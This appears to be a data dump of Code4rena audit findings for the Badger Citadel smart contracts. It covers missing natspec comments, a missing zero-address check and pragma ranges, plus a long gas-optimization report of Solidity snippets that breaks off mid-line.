Vulnerability details\n\nMissing or incomplete natspec comments in contracts\n\n### Proof of Concept\n\nThese functions do not have a comment or partially commented:\n\n`CitadelMinter.getFundingPoolWeights()`\n\n`CitadelMinter.initializeLastMintTimestamp()`\n\n`CitadelMinter._transferToFundingPools()`\n\n`CitadelMinter._removeFundingPool()`\n\n`CitadelMinter._addFundingPool()`\n\n`Funding.clearCitadelPriceFlag()`\n\n`Funding.setSaleRecipient()`\n\n`Funding.setCitadelAssetPriceBounds()`\n\n`GlobalAccessControl.pause()`\n\n`GlobalAccessControl.unpause()`\n\n`KnightingRound.claim()` - no @return tag\n\n`StakedCitadel.depositFor()` - no @param tag for third parameter i.e `proof`\n\n`StakedCitadel._depositWithAuthorization()` - no @param tags\n\n`StakedCitadel._depositForWithAuthorization()` - no @param tags\n\n`StakedCitadelVester.initialize()`\n\n`SupplySchedule.sol`\n\n### Tools Used\n\nManual review\n\n### Recommendation\n\nInclude comments in contracts where there is none. Update contracts which are partially commented\n\n---\n\n### Handle\n\ntchkvsky\n\n### Scope\n\n`SettAccessControl.sol#L37-L54`\n\n### Vulnerability details\n\nMissing zero address validation in permissioned actors\n\n### Impact\n\nAlice calls `setGovernance` without specifying the `_governance`, so Alice loses ownership of the contract.\n\n### Proof of Concept\n\n`SettAccessControl.setStrategist`\n\n`SettAccessControl.setKeeper`\n\n`SettAccessControl.setGovernance`\n\n### Tools Used\n\nManual review\n\n### Recommendation\n\nCheck that the address is not zero.\n\n---\n\nComplex pragma versions used in interfaces\n\n### Handle\n\ntchkvsky\n\n### Vulnerability details\n\nComplex pragma versions is used in interfaces:\n\n`pragma solidity >=0.5.0<=0.9.0` is too complex\n\n### Impact\n\nDifferent versions of solidity might have different bugs that might cause unwanted behavior in contracts. It is recommended to use a single pragma version.\n\n### Proof of Concept\n\n```\n(src/interfaces/badger/IBadgerGuestlist.sol#2) \n(src/interfaces/badger/IBadgerVipGuestlist.sol#2) \n(src/interfaces/badger/IStrategy.sol#3) \n(src/interfaces/badger/IVault.sol#3) \n(src/interfaces/citadel/ICitadelToken.sol#3) \n(src/interfaces/citadel/IGac.sol#3) \n(src/interfaces/citadel/IMedianOracle.sol#3) \n(src/interfaces/citadel/IStakedCitadelLocker.sol#3) \n(src/interfaces/citadel/ISupplySchedule.sol#3) \n(src/interfaces/citadel/IVesting.sol#2) \n(src/interfaces/convex/BoringMath.sol#2) \n(src/interfaces/convex/IRewardStaking.sol#2) \n(src/interfaces/convex/IStakingProxy.sol#2) \n(src/interfaces/convex/MathUtil.sol#2) \n(src/interfaces/erc20/IERC20.sol#3)\n```\n\n### Tools Used\n\nStatic analyzer\n\n### Recommendation\n\nConsider modifying contracts to use a single pragma version. Alternatively, use a modern interface with a stable, yet single solidity version.",
    "dataSource": {
      "name": "code-423n4/2022-04-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-04-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-04-badger-citadel-findings/issues/220"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Vulnerability details:\r\n## Gas Optimizations\r\n\r\n### Use a more recent version of solidity\r\nUse a solidity version of at least 0.8.0 to get overflow protection without `SafeMath`\r\nUse a solidity version of at least 0.8.2 to get compiler automatic inlining\r\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\r\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\r\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\r\n\r\n1. File: external/MedianOracle.sol (line [1](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L1))\r\n```solidity\r\npragma solidity 0.4.24;\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [2](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L2))\r\n```solidity\r\npragma solidity 0.6.12;\r\n```\r\n\r\n### Use a more recent version of solidity\r\nUse a solidity version of at least 0.8.2 to get compiler automatic inlining\r\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\r\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\r\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\r\n\r\n1. File: src/CitadelToken.sol (line [2](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelToken.sol#L2))\r\n```solidity\r\npragma solidity ^0.8.0;\r\n```\r\n2. File: src/GlobalAccessControl.sol (line [3](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L3))\r\n```solidity\r\npragma solidity ^0.8.0;\r\n```\r\n3. File: src/lib/SafeERC20.sol (line [4](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SafeERC20.sol#L4))\r\n```solidity\r\npragma solidity ^0.8.0;\r\n```\r\n\r\n### Unused state variables should be removed\r\nThese unused state variables are wasting a lot of gas. The compiler automatically creates non-payable getter functions which is expensive and each variable, since it is given a value, costs a ton of gas to initialize. Variables initialized to zero cost G~sreset~ (2900 gas) and variables initialized to non-zero cost G~sset~ (20000 gas)\r\n\r\n1. File: src/StakedCitadelLocker.sol (lines [91-99](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L91-L99))\r\n```solidity\r\n    // ========== Not used ==========\r\n    //boost\r\n    address public boostPayment = address(0);\r\n    uint256 public maximumBoostPayment = 0;\r\n    uint256 public boostRate = 10000;\r\n    uint256 public nextMaximumBoostPayment = 0;\r\n    uint256 public nextBoostRate = 10000;\r\n    uint256 public constant denominator = 10000;\r\n    // ==============================\r\n```\r\n\r\n### Changing from `immutable` to just `private` wastes a lot of gas\r\nOne of the changes made after branching this file was to remove the `immutable` keyword. Doing this changes the variable from a deployment-time replacement to a state variable that gets assigned, costing G~sset~ (20000 gas). The variable's value does not change after initialization, so it should remain immutable\r\n1. File: src/StakedCitadelLocker.sol (line [117](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L117))\r\n```solidity\r\n    uint8 private _decimals;\r\n```\r\n\r\n### Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate\r\nSaves a storage slot for the mapping as well as a non-payable getter for the mapping. Depending on the circumstances and sizes of types, can avoid a G~sset~ (20000 gas). Reads and subsequent writes are also cheaper\r\n\r\n1. File: external/StakedCitadelLocker.sol (lines [76-80](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L76-L80))\r\n```solidity\r\n    // user -> reward token -> amount\r\n    mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;\r\n    mapping(address => mapping(address => uint256)) public rewards;\r\n```\r\n2. File: external/StakedCitadelLocker.sol (lines [88-89](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L88-L89))\r\n```solidity\r\n    mapping(address => Balances) public balances;\r\n    mapping(address => LockedBalance[]) public userLocks;\r\n```\r\n3. File: src/KnightingRound.sol (lines [47-51](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L47-L51))\r\n```solidity\r\n    mapping(address => uint256) public boughtAmounts;\r\n    /// Whether an account has claimed tokens\r\n    /// NOTE: can reset boughtAmounts after a claim to optimize gas\r\n    ///       but we need to persist boughtAmounts\r\n    mapping(address => bool) public hasClaimed;\r\n```\r\n4. File: src/StakedCitadel.sol (lines [94-95](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L94-L95))\r\n```solidity\r\n    mapping(address => uint256) public additionalTokensEarned;\r\n    mapping(address => uint256) public lastAdditionalTokenAmount;\r\n```\r\n\r\n### State variables can be packed into fewer storage slots\r\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate G~sset~ (20000 gas). Reads of the variables are also cheaper\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [63](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L63))\r\n```solidity\r\n    IERC20Upgradeable public stakingToken; // xCTDL token\r\n```\r\nVariable ordering with two fewer slots:\r\n address[](32):rewardTokens, mapping(32):rewardData, mapping(32):rewardDistributors, mapping(32):userRewardPerTokenPaid, mapping(32):rewards, uint256(32):lockedSupply, uint256(32):boostedSupply, user-defined[](32):epochs, mapping(32):balances, mapping(32):userLocks, uint256(32):maximumBoostPayment, uint256(32):boostRate, uint256(32):nextMaximumBoostPayment, uint256(32):nextBoostRate, uint256(32):minimumStake, uint256(32):maximumStake, uint256(32):kickRewardPerEpoch, uint256(32):kickRewardEpochDelay, string(32):_name, string(32):_symbol, user-defined(20):stakingToken, bool(1):isShutdown, uint8(1):_decimals, address(20):boostPayment, address(20):stakingProxy\r\n\r\n2. File: src/Funding.sol (line [32](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L32))\r\n```solidity\r\n    IERC20 public citadel; /// token to distribute (in vested xCitadel form)\r\n```\r\nVariable ordering with one fewer slots:\r\n uint256(32):citadelPriceInAsset, uint256(32):minCitadelPriceInAsset, uint256(32):maxCitadelPriceInAsset, uint256(32):assetDecimalsNormalizationValue, user-defined(20):citadel, bool(1):citadelPriceFlag, user-defined(20):xCitadel, user-defined(20):asset, address(20):citadelPriceInAssetOracle, address(20):saleRecipient, user-defined(*):funding\r\n\r\n\r\n### Pre-calculate repeatedly-checked offsets\r\nReading from storage is expensive, so it saves gas when only one variable has to be read versus multiple. If there is a calculation which requires multiple storage reads, the calculation should be optimized to pre-calculate as much as possible, and store the intermediate result in storage. Replace the `saleDuration` variable with a `private` pre-calculated `saleEnd` timestamp, and reference that rather than checking both `saleStart` and `saleDuration` in multiple places. The duration can be calculated by subtracting the start from the end in a `view` function. Making this change saves a G~coldsload~ (2100 gas) for each call to `buy()` and `saleEnded()`\r\n1. File: src/KnightingRound.sol (lines [168-171](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L168-L171))\r\n```solidity\r\n        require(\r\n            block.timestamp < saleStart + saleDuration,\r\n            \"KnightingRound: already ended\"\r\n        );\r\n```\r\n\r\n2. File: src/KnightingRound.sol (lines [259-261](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L259-L261))\r\n```solidity\r\n        hasEnded_ =\r\n            (block.timestamp >= saleStart + saleDuration) ||\r\n            (totalTokenIn >= tokenInLimit);\r\n```\r\n\r\n### State variables should be cached in stack variables rather than re-reading them from storage\r\nThe instances below point to the second+ access of a state variable within a function. With each of these individually, caching will replace a G~warmaccess~ (100 gas) with a much cheaper stack read.\r\nLess obvious optimizations flagged include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, or having local caches of state variable contracts/addresses.\r\n\r\n1. File: external/MedianOracle.sol (line [144](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L144))\r\n```solidity\r\n        providerReports[providerAddress][0].timestamp=1;\r\n```\r\n2. File: external/MedianOracle.sol (line [173](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L173))\r\n```solidity\r\n                uint256 reportTimestampPast = providerReports[providerAddress][index_past].timestamp;\r\n```\r\n3. File: external/MedianOracle.sol (line [213](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L213))\r\n```solidity\r\n        providerReports[provider][0].timestamp = 1;\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [770](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L770))\r\n```solidity\r\n            stakingToken.safeTransfer(stakingProxy, increase);\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [166](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L166))\r\n```solidity\r\n        rewardData[_rewardsToken].lastUpdateTime = uint40(block.timestamp);\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line [229](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L229))\r\n```solidity\r\n        uint256(rewardData[_rewardsToken].rewardPerTokenStored).add(\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [781](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L781))\r\n```solidity\r\n                rewards[_account][_rewardsToken] = 0;\r\n```\r\n8. File: external/StakedCitadelLocker.sol (line [232](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L232))\r\n```solidity\r\n                rewardData[_rewardsToken].rewardRate).mul(1e18).div(rewardData[_rewardsToken].useBoost ? boostedSupply : lockedSupply)\r\n```\r\n9. File: external/StakedCitadelLocker.sol (line [292](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L292))\r\n```solidity\r\n        amount = balances[_user].boosted;\r\n```\r\n10. File: external/StakedCitadelLocker.sol (line [559](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L559))\r\n```solidity\r\n        if (idx == 0 || userLocks[_account][idx - 1].unlockTime < unlockTime) {\r\n```\r\n11. File: external/StakedCitadelLocker.sol (line [537](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L537))\r\n```solidity\r\n        uint256 boostRatio = boostRate.mul(_spendRatio).div(maximumBoostPayment==0?1:maximumBoostPayment);\r\n```\r\n12. File: external/StakedCitadelLocker.sol (line [509](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L509))\r\n```solidity\r\n                maximumBoostPayment = nextMaximumBoostPayment;\r\n```\r\n13. File: external/StakedCitadelLocker.sol (line [506](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L506))\r\n```solidity\r\n                boostRate = nextBoostRate;\r\n```\r\n14. File: external/StakedCitadelLocker.sol (line [762](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L762))\r\n```solidity\r\n        uint256 min = MathUpgradeable.min(minimumStake, minimumStake - _offset);\r\n```\r\n15. File: external/StakedCitadelLocker.sol (line [761](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L761))\r\n```solidity\r\n        uint256 max = maximumStake.add(_offset);\r\n```\r\n16. File: external/StakedCitadelLocker.sol (line [766](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L766))\r\n```solidity\r\n            IStakingProxy(stakingProxy).withdraw(remove);\r\n```\r\n17. File: src/CitadelMinter.sol (line [217](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L217))\r\n```solidity\r\n            IERC20Upgradeable(address(citadelToken)).safeTransfer(address(cachedXCitadel), stakingAmount);\r\n```\r\n18. File: src/CitadelMinter.sol (line [276](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L276))\r\n```solidity\r\n            uint256 _newTotalWeight = totalFundingPoolWeight;\r\n```\r\n19. File: src/Funding.sol (line [134](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L134))\r\n```solidity\r\n        assetDecimalsNormalizationValue = 10**asset.decimals();\r\n```\r\n20. File: src/Funding.sol (line [341](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L341))\r\n```solidity\r\n        asset.safeTransfer(saleRecipient, amount);\r\n```\r\n21. File: src/Funding.sol (line [434](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L434))\r\n```solidity\r\n                minCitadelPriceInAsset,\r\n```\r\n22. File: src/Funding.sol (line [461](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L461))\r\n```solidity\r\n                minCitadelPriceInAsset,\r\n```\r\n23. File: src/Funding.sol (line [435](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L435))\r\n```solidity\r\n                maxCitadelPriceInAsset\r\n```\r\n24. File: src/Funding.sol (line [462](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L462))\r\n```solidity\r\n                maxCitadelPriceInAsset\r\n```\r\n25. File: src/KnightingRound.sol (line [148](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L148))\r\n```solidity\r\n        tokenInNormalizationValue = 10**tokenIn.decimals();\r\n```\r\n26. File: src/KnightingRound.sol (line [169](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L169))\r\n```solidity\r\n            block.timestamp < saleStart + saleDuration,\r\n```\r\n27. File: src/KnightingRound.sol (line [198](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L198))\r\n```solidity\r\n        totalTokenIn = totalTokenIn + _tokenInAmount;\r\n```\r\n28. File: src/KnightingRound.sol (line [250](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L250))\r\n```solidity\r\n            limitLeft_ = tokenInLimit - totalTokenIn;\r\n```\r\n29. File: src/KnightingRound.sol (line [250](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L250))\r\n```solidity\r\n            limitLeft_ = tokenInLimit - totalTokenIn;\r\n```\r\n30. File: src/KnightingRound.sol (line [179](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L179))\r\n```solidity\r\n            require(guestlist.authorized(msg.sender, _proof), \"not authorized\");\r\n```\r\n31. File: src/StakedCitadel.sol (line [774](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L774))\r\n```solidity\r\n        token.safeTransferFrom(msg.sender, address(this), _amount);\r\n```\r\n32. File: src/StakedCitadel.sol (line [819](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L819))\r\n```solidity\r\n            uint256 _after = token.balanceOf(address(this));\r\n```\r\n33. File: src/StakedCitadel.sol (line [795](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L795))\r\n```solidity\r\n                guestList.authorized(_recipient, _amount, proof),\r\n```\r\n34. File: src/StakedCitadel.sol (line [507](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L507))\r\n```solidity\r\n                IStrategy(strategy).balanceOf() == 0,\r\n```\r\n35. File: src/StakedCitadel.sol (line [723](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L723))\r\n```solidity\r\n        IStrategy(strategy).earn();\r\n```\r\n36. File: src/StakedCitadel.sol (line [831](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L831))\r\n```solidity\r\n        token.safeTransfer(vesting, _amount);\r\n```\r\n37. File: src/StakedCitadel.sol (line [909](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L909))\r\n```solidity\r\n            ? (managementFee * (balance() - _harvestedAmount) * duration) /\r\n```\r\n38. File: src/SupplySchedule.sol (line [64](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L64))\r\n```solidity\r\n        return (_timestamp - globalStartTimestamp) / epochLength;\r\n```\r\n39. File: src/SupplySchedule.sol (line [184](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L184))\r\n```solidity\r\n            lastMintTimestamp > globalStartTimestamp,\r\n```\r\n\r\n### Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()`\r\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\r\n\r\n1. File: src/lib/SafeERC20.sol (line [79](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SafeERC20.sol#L79))\r\n```solidity\r\n            uint256 newAllowance = oldAllowance - value;\r\n```\r\n\r\n### Cheaper checks should be done first\r\nChecking of equality to `account` is cheaper than looking up the `gac` role via static call, so that check should be on the left of the condition to shortcut the logic\r\n1. File: src/lib/GlobalAccessControlManaged.sol (line [63](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/lib/GlobalAccessControlManaged.sol#L63))\r\n```solidity\r\n            gac.hasRole(role, msg.sender) || msg.sender == account,\r\n```\r\n\r\n### `.length` should not be looked up in every loop of a `for`-loop\r\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length. Storage array length checks incur an extra G~warmaccess~ (100 gas) PER-LOOP.\r\n\r\n1. File: external/MedianOracle.sol (line [226](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L226))\r\n```solidity\r\n        for (uint256 i = 0; i < providers.length; i++) {\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [267](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L267))\r\n```solidity\r\n        for (uint256 i = 0; i < userRewards.length; i++) {\r\n```\r\n3. File: external/StakedCitadelLocker.sol (line [459](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L459))\r\n```solidity\r\n        for (uint i = nextUnlockIndex; i < locks.length; i++) {\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [777](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L777))\r\n```solidity\r\n        for (uint i; i < rewardTokens.length; i++) {\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [838](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L838))\r\n```solidity\r\n            for (uint i = 0; i < rewardTokens.length; i++) {\r\n```\r\n6. File: src/lib/GlobalAccessControlManaged.sol (line [48](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L48))\r\n```solidity\r\n        for (uint256 i = 0; i < roles.length; i++) {\r\n```\r\n\r\n### `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops\r\n\r\n1. File: external/MedianOracle.sol (line [164](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L164))\r\n```solidity\r\n        for (uint256 i = 0; i < reportsCount; i++) {\r\n```\r\n2. File: external/MedianOracle.sol (line [226](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L226))\r\n```solidity\r\n        for (uint256 i = 0; i < providers.length; i++) {\r\n```\r\n3. File: external/StakedCitadelLocker.sol (line [267](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L267))\r\n```solidity\r\n        for (uint256 i = 0; i < userRewards.length; i++) {\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [296](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L296))\r\n```solidity\r\n        for (uint i = nextUnlockIndex; i < locksLength; i++) {\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [325](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L325))\r\n```solidity\r\n        for (uint i = locks.length - 1; i + 1 != 0; i--) {\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line [363](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L363))\r\n```solidity\r\n        for (uint i = locks.length - 1; i + 1 != 0; i--) {\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [391](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L391))\r\n```solidity\r\n        for (uint i = epochindex - 1; i + 1 != 0; i--) {\r\n```\r\n8. File: external/StakedCitadelLocker.sol (line [409](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L409))\r\n```solidity\r\n        for (uint i = _epoch; i + 1 != 0; i--) {\r\n```\r\n9. File: external/StakedCitadelLocker.sol (line [428](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L428))\r\n```solidity\r\n        for (uint256 i = 0; i < 128; i++) {\r\n```\r\n10. File: external/StakedCitadelLocker.sol (line [459](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L459))\r\n```solidity\r\n        for (uint i = nextUnlockIndex; i < locks.length; i++) {\r\n```\r\n11. File: external/StakedCitadelLocker.sol (line [659](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L659))\r\n```solidity\r\n            for (uint i = nextUnlockIndex; i < length; i++) {\r\n```\r\n12. File: external/StakedCitadelLocker.sol (line [777](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L777))\r\n```solidity\r\n        for (uint i; i < rewardTokens.length; i++) {\r\n```\r\n13. File: external/StakedCitadelLocker.sol (line [838](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L838))\r\n```solidity\r\n            for (uint i = 0; i < rewardTokens.length; i++) {\r\n```\r\n14. File: src/CitadelMinter.sol (line [152](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L152))\r\n```solidity\r\n        for (uint256 i = 0; i < numPools; i++) {\r\n```\r\n15. File: src/CitadelMinter.sol (line [344](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L344))\r\n```solidity\r\n        for (uint256 i; i < length; ++i) {\r\n```\r\n16. File: src/lib/GlobalAccessControlManaged.sol (line [48](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L48))\r\n```solidity\r\n        for (uint256 i = 0; i < roles.length; i++) {\r\n```\r\n17. File: src/SupplySchedule.sol (line [208](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L208))\r\n```solidity\r\n        for (uint256 i = startingEpoch; 